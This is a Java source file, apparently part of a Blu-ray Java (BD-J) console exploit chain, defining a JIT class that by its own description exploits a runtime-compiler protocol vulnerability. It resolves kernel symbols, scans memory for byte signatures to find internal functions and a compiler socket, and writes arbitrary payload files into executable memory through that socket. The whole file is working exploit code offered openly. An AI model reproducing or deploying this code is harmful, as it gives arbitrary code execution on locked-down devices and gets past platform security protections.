/*
 * Copyright (C) 2021 Andy Nguyen
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

package com.bdjb;

import java.io.RandomAccessFile;

/**
 * JIT class that exploits a vulnerability in the runtime-compiler protocol to map payloads to
 * executable memory.
 */
final class JIT {
  static final int BDJ_MODULE_HANDLE = 0;

  static final int MAX_JIT_SIZE = 24 * 1024 * 1024; // Actually max is 30MB, but let's be safe.
  static final int PAGE_SIZE = 0x4000;
  static final int ALIGNMENT = 0x100000;

  private static final int CHUNK_SIZE = 0x30;

  private static final int SCE_KERNEL_MODULE_INFO_SIZE = 0x160;

  private static final int COMPILER_AGENT_REQUEST_SIZE = 0x58;

  private static final byte ACK_MAGIC_NUMBER = (byte) 0xAA;

  private static final byte[] BUFFER_BLOB_CREATE_SEQ = {
    (byte) 0x89, (byte) 0xF8, (byte) 0x49, (byte) 0x8B, (byte) 0x0F
  };

  private static final byte[] COMPILER_AGENT_SENDER_THREAD_SEQ = {
    (byte) 0x4C, (byte) 0x8B, (byte) 0x70, (byte) 0x08, (byte) 0x41
  };

  private static final String SCE_KERNEL_GET_MODULE_INFO_SYMBOL = "sceKernelGetModuleInfo";
  private static final String WRITE_SYMBOL = "write";
  private static final String READ_SYMBOL = "read";

  private static JIT instance;

  private final API api;

  private long sceKernelGetModuleInfo;
  private long read;
  private long write;
  private long BufferBlob__create;

  private int compilerAgentSocket;

  private JIT() throws Exception {
    this.api = API.getInstance();
    this.init();
  }

  static synchronized JIT getInstance() throws Exception {
    if (instance == null) {
      instance = new JIT();
    }
    return instance;
  }

  private void init() {
    sceKernelGetModuleInfo =
        api.dlsym(API.LIBKERNEL_MODULE_HANDLE, SCE_KERNEL_GET_MODULE_INFO_SYMBOL);
    read = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, READ_SYMBOL);
    write = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, WRITE_SYMBOL);

    if (sceKernelGetModuleInfo == 0 || read == 0 || write == 0) {
      throw new IllegalStateException("Symbols could not be found.");
    }

    long modinfo = api.malloc(SCE_KERNEL_MODULE_INFO_SIZE);
    api.memset(modinfo, 0, SCE_KERNEL_MODULE_INFO_SIZE);
    api.write64(modinfo + 0x00, SCE_KERNEL_MODULE_INFO_SIZE);
    if (api.call(sceKernelGetModuleInfo, BDJ_MODULE_HANDLE, modinfo) != 0) {
      throw new IllegalStateException("sceKernelGetModuleInfo failed.");
    }

    long bdjBase = api.read64(modinfo + 0x108);
    long bdjSize = api.read32(modinfo + 0x110);

    api.free(modinfo);

    int i = 0;
    while (i < bdjSize
        && api.memcmp(bdjBase + i, BUFFER_BLOB_CREATE_SEQ, BUFFER_BLOB_CREATE_SEQ.length) != 0) {
      i++;
    }
    if (i == bdjSize) {
      throw new IllegalStateException("BufferBlob::create function could not be found.");
    }
    BufferBlob__create = bdjBase + i - 0x21;

    i = 0;
    while (i < bdjSize
        && api.memcmp(
                bdjBase + i,
                COMPILER_AGENT_SENDER_THREAD_SEQ,
                COMPILER_AGENT_SENDER_THREAD_SEQ.length)
            != 0) {
      i++;
    }
    if (i == bdjSize) {
      throw new IllegalStateException("Compiler agent socket could not be found.");
    }
    long compilerAgentSocketOpcode = bdjBase + i - 0x10;
    compilerAgentSocket =
        api.read32(compilerAgentSocketOpcode + api.read32(compilerAgentSocketOpcode + 0x3) + 0x7);
  }

  long mapPayload(String path) throws Exception {
    RandomAccessFile file = new RandomAccessFile(path, "r");

    // TODO: Currently we just use maximum size so that the address is predictable.
    long size = MAX_JIT_SIZE;
    //    long size = file.length() + 0x88 + ALIGNMENT - 1;
    //    if (size >= MAX_JIT_SIZE) {
    //      throw new IllegalArgumentException("Payload is too big.");
    //    }

    long name = api.malloc(4);
    api.strcpy(name, "jit");
    long blob = api.call(BufferBlob__create, name, size);
    long code = blob + api.read32(blob + 0x20);
    api.free(name);

    long address = (code + ALIGNMENT - 1) & ~(ALIGNMENT - 1);

    long request = api.malloc(COMPILER_AGENT_REQUEST_SIZE);
    long response = api.malloc(API.INT8_SIZE);

    for (long i = 0; i < file.length(); i += CHUNK_SIZE) {
      byte[] chunk = new byte[CHUNK_SIZE];

      file.seek(i);
      file.read(chunk, 0, (int) Math.min(file.length() - i, CHUNK_SIZE));

      api.memset(request, 0, COMPILER_AGENT_REQUEST_SIZE);
      api.memcpy(request + 0x00, chunk, CHUNK_SIZE);
      api.write64(request + 0x38, address + i - 0x28);
      api.call(write, compilerAgentSocket, request, COMPILER_AGENT_REQUEST_SIZE);

      api.write8(response, (byte) 0);
      api.call(read, compilerAgentSocket, response, API.INT8_SIZE);

      if (api.read8(response) != ACK_MAGIC_NUMBER) {
        throw new IllegalStateException("Wrong compiler response.");
      }
    }

    api.free(response);
    api.free(request);

    return address;
  }
}
